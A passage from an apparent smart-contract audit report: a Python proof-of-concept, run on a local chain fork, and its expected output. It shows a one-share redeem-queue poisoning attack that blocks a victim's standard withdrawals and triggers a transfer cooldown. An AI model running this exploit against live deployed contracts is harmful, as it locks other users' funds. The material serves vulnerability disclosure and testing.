    poison_epoch = request_epoch(args)
    poison_receipt = send(
        args,
        actors["attacker"],
        JUNIOR,
        "requestRedeem(uint256,address,address)",
        (1, actors["victim"], actors["attacker"]),
        "attacker-poison-request",
    )
    assert_equal("poison-is-victim-head", uint_call(args, JUNIOR, "controllerRedeemHead(address)", actors["victim"]), poison_epoch)
    settle_epoch(args, actors["keeper"], poison_epoch, "poison-epoch")
    assert_equal(
        "poison-refundable-share",
        uint_call(args, JUNIOR, "refundableRedeemRequest(uint256,address)", poison_epoch, actors["victim"]),
        1,
    )
    assert_equal(
        "poison-refund-pending",
        bool_call(args, JUNIOR, "redeemRefundPending(uint256,address)", poison_epoch, actors["victim"]),
        True,
    )

    victim_epoch = request_epoch(args)
    assert_gt("separate-victim-epoch", victim_epoch, poison_epoch)
    requested_victim_shares = victim_shares // 2
    send(
        args,
        actors["victim"],
        JUNIOR,
        "requestRedeem(uint256,address,address)",
        (requested_victim_shares, actors["victim"], actors["victim"]),
        "victim-redeem-request",
    )
    assert_equal("victim-tail-is-later-request", uint_call(args, JUNIOR, "controllerRedeemTail(address)", actors["victim"]), victim_epoch)
    settle_epoch(args, actors["keeper"], victim_epoch, "victim-redeem-epoch")
    funded = uint_call(args, JUNIOR, "claimableRedeemRequest(uint256,address)", victim_epoch, actors["victim"])
    assert_gt("victim-later-request-funded", funded, 1)
    assert_equal("standard-head-capacity-denied", uint_call(args, JUNIOR, "maxRedeem(address)", actors["victim"]), 0)
    failed_standard = send(
        args,
        actors["victim"],
        JUNIOR,
        "redeem(uint256,address,address)",
        (1, actors["victim"], actors["victim"]),
        "victim-standard-redeem-reverts",
        expected_status=0,
    )

    cooldown_before = uint_call(args, JUNIOR, "lastDepositTime(address)", actors["victim"])
    victim_assets_before = uint_call(args, TOKEN, "balanceOf(address)", actors["victim"])
    partial = funded // 2
    bypass_receipt = send(
        args,
        actors["victim"],
        JUNIOR,
        "claimRedeem(uint256,uint256,address,address)",
        (victim_epoch, partial, actors["victim"], actors["victim"]),
        "victim-explicit-id-bypass",
    )
    assert_gt(
        "explicit-id-assets-received",
        uint_call(args, TOKEN, "balanceOf(address)", actors["victim"]),
        victim_assets_before,
    )
    assert_equal("bypass-preserves-poison-head", uint_call(args, JUNIOR, "controllerRedeemHead(address)", actors["victim"]), poison_epoch)
    assert_equal("bypass-does-not-reset-cooldown", uint_call(args, JUNIOR, "lastDepositTime(address)", actors["victim"]), cooldown_before)
    assert_equal("bypass-preserves-standard-denial", uint_call(args, JUNIOR, "maxRedeem(address)", actors["victim"]), 0)
    assert_equal(
        "bypass-preserves-refundable-poison",
        uint_call(args, JUNIOR, "refundableRedeemRequest(uint256,address)", poison_epoch, actors["victim"]),
        1,
    )

    victim_wallet_before = uint_call(args, JUNIOR, "balanceOf(address)", actors["victim"])
    cleanup_receipt = send(
        args,
        actors["victim"],
        JUNIOR,
        "claimRedeemRefund(uint256,address,address)",
        (poison_epoch, actors["victim"], actors["victim"]),
        "victim-refund-cleanup",
    )
    cleanup_time = block_timestamp(int(cleanup_receipt["blockNumber"], 16))
    assert_equal("cleanup-returns-one-share", uint_call(args, JUNIOR, "balanceOf(address)", actors["victim"]), victim_wallet_before + 1)
    assert_equal("cleanup-advances-head", uint_call(args, JUNIOR, "controllerRedeemHead(address)", actors["victim"]), victim_epoch)
    assert_equal("cleanup-starts-cooldown", uint_call(args, JUNIOR, "lastDepositTime(address)", actors["victim"]), cleanup_time)
    assert_equal("cleanup-locks-wallet-redemption", uint_call(args, JUNIOR, "maxRequestRedeem(address)", actors["victim"]), 0)
    transfer_denial = send(
        args,
        actors["victim"],
        JUNIOR,
        "transfer(address,uint256)",
        (actors["sink"], 1),
        "victim-transfer-during-cooldown-reverts",
        expected_status=0,
    )

    remaining = uint_call(args, JUNIOR, "maxRedeem(address)", actors["victim"])
    assert_gt("standard-path-restored", remaining, 0)
    standard_assets_before = uint_call(args, TOKEN, "balanceOf(address)", actors["victim"])
    send(
        args,
        actors["victim"],
        JUNIOR,
        "redeem(uint256,address,address)",
        (remaining, actors["victim"], actors["victim"]),
        "victim-restored-standard-redeem",
    )
    assert_gt(
        "restored-standard-assets-received",
        uint_call(args, TOKEN, "balanceOf(address)", actors["victim"]),
        standard_assets_before,
    )

    exact_unlock = cleanup_time + cooldown
    advance_exact_to(exact_unlock - 1, "cooldown-boundary-minus-one")
    assert_equal("still-locked-before-boundary", uint_call(args, JUNIOR, "maxRequestRedeem(address)", actors["victim"]), 0)
    advance_exact_to(exact_unlock, "cooldown-boundary")
    victim_wallet = uint_call(args, JUNIOR, "balanceOf(address)", actors["victim"])
    assert_gt("victim-wallet-remains-positive", victim_wallet, 0)
    assert_equal("wallet-unlocked-at-boundary", uint_call(args, JUNIOR, "maxRequestRedeem(address)", actors["victim"]), victim_wallet)
    send(
        args,
        actors["victim"],
        JUNIOR,
        "transfer(address,uint256)",
        (actors["sink"], 1),
        "victim-transfer-at-boundary",
    )

    result = {
        "result": "PASS",
        "transaction_count": _transaction_count,
        "poison_epoch": poison_epoch,
        "victim_epoch": victim_epoch,
        "cooldown_seconds": cooldown,
        "gas": {
            "attacker_poison": int(poison_receipt["gasUsed"], 16),
            "failed_standard_redeem": int(failed_standard["gasUsed"], 16),
            "explicit_id_bypass": int(bypass_receipt["gasUsed"], 16),
            "victim_cleanup": int(cleanup_receipt["gasUsed"], 16),
            "transfer_denial": int(transfer_denial["gasUsed"], 16),
        },
        "attacker_share_sacrifice_atoms": 1,
    }
    record("af009-result", "PASS", **result)
    return result


def parse_args() -> argparse.Namespace:
    lane = pathlib.Path(__file__).resolve().parent.parent
    parser = argparse.ArgumentParser()
    parser.add_argument("--repo", type=pathlib.Path, default=lane.parent.parent / "source/audit-comp-plether")
    parser.add_argument(
        "--foundry-bin",
        type=pathlib.Path,
        default=pathlib.Path("/data/market/debug-contracts/tmp-rescue-2026-10-25/foundry-v1.5.1"),
    )
    parser.add_argument("--evidence-dir", type=pathlib.Path, required=True)
    parser.add_argument("--ack-final-run", action="store_true")
    args = parser.parse_args()
    if not args.ack_final_run:
        parser.error("--ack-final-run is required")
    args.lane = lane
    args.repo = args.repo.resolve()
    args.foundry_bin = args.foundry_bin.resolve()
    args.cast = args.foundry_bin / "cast"
    args.manifest = args.repo / "deployments/releases/2026-10-28-perps-arbitrum-sepolia-v2.0.0/manifest.json"
    args.evidence_dir = args.evidence_dir.resolve()
    try:
        args.evidence_dir.relative_to(lane)
    except ValueError as exc:
        raise RuntimeError("evidence directory must be inside the PoC lane") from exc
    return args


def main() -> int:
    global _run_handle
    args = parse_args()
    if not args.evidence_dir.is_dir():
        raise RuntimeError("pre-created evidence directory is required")
    _run_handle = (args.evidence_dir / "run.jsonl").open("x", encoding="utf-8")
    result = {"result": "FAIL_PRESERVED_NO_AUTOMATIC_RETRY"}
    try:
        assert_equal("local-chain-id", int(rpc("eth_chainId", []), 16), CHAIN_ID)
        assert_equal("pinned-fork-block", int(rpc("eth_blockNumber", []), 16), FORK_BLOCK)
        release = manifest_runtime_check(args)
        accounts = rpc("eth_accounts", [])
        result = run_target(args, accounts, release)
    finally:
        (args.evidence_dir / "result.json").write_text(
            json.dumps(result, indent=2, sort_keys=True) + "\n", encoding="utf-8"
        )
        if _run_handle is not None:
            _run_handle.close()
    if result.get("result") != "PASS":
        raise RuntimeError("target failed; evidence preserved; no automatic retry")
    print("AF009 DEPLOYED-FORK PASS; RUN CONSUMED; DO NOT RERUN")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
```

## Expected result

The retained exact run completed all 85 assertions and printed:

```text
local-chain-id: PASS
pinned-fork-block: PASS
release-runtime-count: PASS
runtime-hashes: PASS
one-share-zero-quote: PASS
attacker-poison-request: PASS
poison-is-victim-head: PASS
victim-later-request-funded: PASS
standard-head-capacity-denied: PASS
victim-standard-redeem-reverts: PASS
victim-explicit-id-bypass: PASS
bypass-preserves-poison-head: PASS
victim-refund-cleanup: PASS
cleanup-starts-cooldown: PASS
victim-transfer-during-cooldown-reverts: PASS
standard-path-restored: PASS
cooldown-boundary-minus-one: PASS
still-locked-before-boundary: PASS
cooldown-boundary: PASS
victim-transfer-at-boundary: PASS
af009-result: PASS
AF009 DEPLOYED-FORK PASS; RUN CONSUMED; DO NOT RERUN
```

The final JSON row records 20 local transactions, a one-share-atom attacker sacrifice,
poison epoch `498249`, later victim epoch `498250`, and cooldown `3600` seconds. The
full retained trace and safety-orchestration logs are supporting evidence; the code
required to reproduce the vulnerability is complete above.

